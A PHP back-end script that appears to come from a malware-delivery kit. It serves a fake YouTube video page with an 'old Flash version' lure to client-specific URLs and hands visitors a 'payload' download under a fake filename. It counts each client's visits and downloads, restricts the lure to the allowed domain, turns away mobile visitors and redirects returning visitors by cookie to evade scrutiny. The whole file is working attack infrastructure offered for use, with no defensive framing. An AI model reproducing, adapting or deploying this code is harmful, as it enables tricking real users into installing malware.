<?php
	
	include('youpoop.php');
	include('../config.php');
	include('../mDetect.php');
	
	include('../manager/functions.php');
	
	$detect = new Mobile_Detect;
	
	if(isset($_POST['dl'])){
			
		$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
		mysql_select_db(DB_NAME, $link);
		mysql_set_charset("utf8");
		
		$cname = mysql_real_escape_string($_POST['name']);
		
		$sql_select = "SELECT downloads FROM clients WHERE watch_url = '$cname' LIMIT 1;";
		$do_select = mysql_query($sql_select);
		$result_select = mysql_fetch_array($do_select);
		
		$count_v = $result_select[0];
		$count_v ++;
		
		$sql_q = "UPDATE `".DB_NAME."`.`clients` SET `downloads` = '$count_v' WHERE `clients`.`watch_url` = '$cname' LIMIT 1;";				
		mysql_query($sql_q);
	
	}
	
	if(isset($_GET['v'])){
		
		$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
		mysql_select_db(DB_NAME, $link);
		mysql_set_charset("utf8");
		
		$cname = strip_tags($_GET['v']);
		$cname = htmlspecialchars($cname);
		$cname = mysql_real_escape_string($cname);
		
		$sql_query = "SELECT * FROM clients WHERE watch_url = '$cname'";
		$do_q = mysql_query($sql_query);
		
		if(mysql_num_rows($do_q) != 0){
			
			$result_q = mysql_fetch_array($do_q);

			if($_GET['v'] == $result_q['watch_url']){
				
				$lang_name = $result_q['lang'];
				$sql_settings = "SELECT * FROM settings";
				$sql_lang = "SELECT * FROM languages WHERE name = '$lang_name'";
				$do_settings = mysql_query($sql_settings);
				$do_lang = mysql_query($sql_lang);
				$result_settings = mysql_fetch_array($do_settings);
				$result_l = mysql_fetch_array($do_lang);
				
				if($result_settings['autodetect_language'] == 0){
					$lang_file_ext = $result_l['filename'];
					$lang_name = $result_l['name'];
				}else{
					$lang_file_ext = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'],0,2).'.lang';
					if(file_exists($lang_directory.$lang_file_ext)){
						$sql_lang = "SELECT * FROM languages WHERE filename = '$lang_file_ext'";
						$do_lang = mysql_query($sql_lang);
						$result_l = mysql_fetch_array($do_lang);
						$lang_name = $result_l['name'];
					}else{
						$lang_file_ext = "en.lang";
						$lang_name = "EN";
					}
				}
				
				$method = "_".$result_q['method'].'_';
				$domain_allowed = $result_q['domain'];
				$filename = $result_q['fakefn'];
				
				$domain = $result_q['domain'];
				$protocol = 'http://';
				$sql_check_domain = "SELECT * FROM domains WHERE name = '$domain'";
				$do_check_domain = mysql_query($sql_check_domain);
				$domain_result = mysql_fetch_array($do_check_domain);
				
				if($domain_result['ssl'] == '1'){
					$protocol = 'https://';
				}
				
				$youtube_base_addr = $protocol.$_SERVER['SERVER_NAME'].'/youtube/';
				
				if($result_q['personal'] == '0'){
					$template = $result_q['template'];
					$sql_query_template = "SELECT * FROM templates WHERE name = '$template'";
					$do_t = mysql_query($sql_query_template);
					$result_t = mysql_fetch_array($do_t);
					$content = $result_t['text'];
				}else{
					$sql_query_template = "SELECT * FROM personal_templates WHERE client = '$cname'";
					$do_t = mysql_query($sql_query_template);
					$result_t = mysql_fetch_array($do_t);
					$content = $result_t['template'];
				}			
				
				if($_SERVER['SERVER_NAME'] == $domain_allowed){
					
					if(file_exists($lang_directory.$lang_file_ext)){
						
						$lang_file_content = json_decode(file_get_contents($lang_directory.$lang_file_ext), true);

						$name = mysql_real_escape_string($result_q['name']);
						$sql_y = "SELECT * FROM youtube WHERE name = '$name'";
						$query_y = mysql_query($sql_y);
						$result_y = mysql_fetch_array($query_y);
	
						$keyword = $result_y['keyword'];
						$keywordf = $keyword."2016";
						
						$big_img_link = $result_y['big_img_link'];
						
						$cur_video_title = $result_y['cur_video_title'];
						$cur_video_thumb_img_url = $result_y['cur_video_thumb_img_url'];
						$cur_video_channel_name = $result_y['cur_video_channel_name'];
						$cur_video_channel_link = $result_y['cur_video_channel_link'];
						$cur_video_channel_subscribers = number_format($result_y['cur_video_channel_subscribers'],0,'',' ');
						$cur_video_views = number_format($result_y['cur_video_views'],0,'',' ');
						
						$cur_video_likes_p = number_format($result_y['cur_video_likes_p'],0,'',' ');
						$cur_video_likes_c = number_format($result_y['cur_video_likes_с'],0,'',' ');
						
						$cur_video_dislikes_p = number_format($result_y['cur_video_dislikes_p'],0,'',' ');
						$cur_video_dislikes_c = number_format($result_y['cur_video_dislikes_с'],0,'',' ');
						
						$cur_video_published_date = $result_y['cur_video_published_date'];
						$cur_video_descr = $result_y['cur_video_descr'];
						
						$cur_video_category = $result_y['cur_video_category'];
						$cur_video_license = $result_y['cur_video_license'];
						
						$cur_video_duration = $result_y['cur_video_duration'];
						$redirect = $result_y['redirect'];
						$link_download = $result_q['payload'];
						
						$YOU_LNG_TOP = $lang_file_content['YOU_LNG_TOP'];
						$YOU_ADD_VIDEO = $lang_file_content['YOU_ADD_VIDEO'];
						$YOU_SIGNIN = $lang_file_content['YOU_SIGNIN'];
						$YOU_SEARCH = $lang_file_content['YOU_SEARCH'];
						$YOU_ENTER_REQUEST = $lang_file_content['YOU_ENTER_REQUEST'];
						$YOU_H1_VIDEO = $lang_file_content['YOU_H1_VIDEO'];
						$YOU_OLD_FLASH_VERSION = $lang_file_content['YOU_OLD_FLASH_VERSION'];
						$YOU_NEXT = $lang_file_content['YOU_NEXT'];
						$YOU_VOLUME_DISABLE = $lang_file_content['YOU_VOLUME_DISABLE'];
						$YOU_SUBTITLES = $lang_file_content['YOU_SUBTITLES'];
						$YOU_SETTINGS = $lang_file_content['YOU_SETTINGS'];
						$YOU_BIG_SCREEN = $lang_file_content['YOU_BIG_SCREEN'];
						$YOU_FULL_SCREEN = $lang_file_content['YOU_FULL_SCREEN'];
						$YOU_SUBSCRIBE = $lang_file_content['YOU_SUBSCRIBE'];
						$YOU_ADD_TO = $lang_file_content['YOU_ADD_TO'];
						$YOU_SHARE = $lang_file_content['YOU_SHARE'];
						$YOU_MORE = $lang_file_content['YOU_MORE'];
						$YOU_ABUSE = $lang_file_content['YOU_ABUSE'];
						$YOU_VIDEO_TEXT = $lang_file_content['YOU_VIDEO_TEXT'];
						$YOU_VIEWS = $lang_file_content['YOU_VIEWS'];
						$YOU_PUBLISHED = $lang_file_content['YOU_PUBLISHED'];
						$YOU_CATEGORY = $lang_file_content['YOU_CATEGORY'];
						$YOU_LICENSE = $lang_file_content['YOU_LICENSE'];
						$YOU_HIDE = $lang_file_content['YOU_HIDE'];
						$YOU_COMMENTS_ARE_DISABLED = $lang_file_content['YOU_COMMENTS_ARE_DISABLED'];
						$YOU_AUTOPLAY = $lang_file_content['YOU_AUTOPLAY'];
						$YOU_DURATION = $lang_file_content['YOU_DURATION'];
						$YOU_NEW = $lang_file_content['YOU_NEW'];
						$YOU_LANG_NAME = $lang_file_content['YOU_LANG_NAME'];
						$YOU_LANGUAGE = $lang_file_content['YOU_LANGUAGE'];
						$YOU_COUNTRY_NAME = $lang_file_content['YOU_COUNTRY_NAME'];
						$YOU_COUNTRY = $lang_file_content['YOU_COUNTRY'];
						$YOU_SAFE_MODE = $lang_file_content['YOU_SAFE_MODE'];
						$YOU_DISABLED = $lang_file_content['YOU_DISABLED'];
						$YOU_VIEWED = $lang_file_content['YOU_VIEWED'];
						$YOU_HELP = $lang_file_content['YOU_HELP'];
						$YOU_MENU_ABOUT = $lang_file_content['YOU_MENU_ABOUT'];
						$YOU_MENU_PRESS = $lang_file_content['YOU_MENU_PRESS'];
						$YOU_MENU_RIGHTS = $lang_file_content['YOU_MENU_RIGHTS'];
						$YOU_MENU_AUTHORS = $lang_file_content['YOU_MENU_AUTHORS'];
						$YOU_MENU_ADVERT = $lang_file_content['YOU_MENU_ADVERT'];
						$YOU_MENU_DEV = $lang_file_content['YOU_MENU_DEV'];
						$YOU_MENU_YOUPLUS = $lang_file_content['YOU_MENU_YOUPLUS'];
						$YOU_MENU_TERMS = $lang_file_content['YOU_MENU_TERMS'];
						$YOU_MENU_PRIVACY = $lang_file_content['YOU_MENU_PRIVACY'];
						$YOU_MENU_POLICY = $lang_file_content['YOU_MENU_POLICY'];
						$YOU_MENU_FEEDBACK = $lang_file_content['YOU_MENU_FEEDBACK'];
						$YOU_MENU_NEWFUNCS = $lang_file_content['YOU_MENU_NEWFUNCS'];
						
						$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
						mysql_select_db(DB_NAME);						
						$sql_select = "SELECT visits FROM clients WHERE watch_url = '$cname' LIMIT 1;";
						$do_select = mysql_query($sql_select);
						$result_select = mysql_fetch_array($do_select);					
						$count_v = $result_select[0];
						$count_v ++;						
						$sql_q = "UPDATE `".DB_NAME."`.`clients` SET `visits` = '$count_v' WHERE `clients`.`watch_url` = '$cname' LIMIT 1;";	
						mysql_query($sql_q);
						
						if(!isset($_COOKIE['_SRFa'])){
							if($detect->isMobile() || $detect->isTablet()){
								@header("Location: ../../../../../error");
							}else{
								require_once('you.tpl');
							}
						}else{
							echo "<script>window.location.href = '".$redirect."';</script>";
						}
						
					}else{
						@header("Location: ".REDIRECT_LANGFILE_NOT_EXISTS);			
					}
				
				}else{
					@header("Location: ".REDIRECT_WRONG_DOMAIN);
				}			
				
			}else{
				@header("Location: ".REDIRECT_WRONG_FILENAME);
			}

		}else{
			@header("Location: ".REDIRECT_WRONG_CLIENT);
		}
		
	}
	
?>

